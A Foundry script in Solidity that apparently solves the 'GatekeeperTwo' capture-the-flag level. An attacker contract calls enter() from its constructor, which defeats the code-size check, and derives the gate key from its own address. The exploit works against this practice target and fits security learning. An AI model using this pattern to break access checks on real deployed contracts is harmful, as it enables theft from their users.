//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";
 
contract GatekeeperTwoSolution is Script {
    GatekeeperTwo gateKeeperInstance = GatekeeperTwo(0x2BDD86f9b30E5D4A3A3A326BA70eFCA5B4072df5);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("entrant before:", gateKeeperInstance.entrant());
        new GateKeeperAttack(address(gateKeeperInstance));
        console.log("entrant after:", gateKeeperInstance.entrant());
        vm.stopBroadcast();
    }
}

contract GateKeeperAttack {
    constructor(address target) {
        bytes8 key = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        GatekeeperTwo(target).enter(key);
    }
}
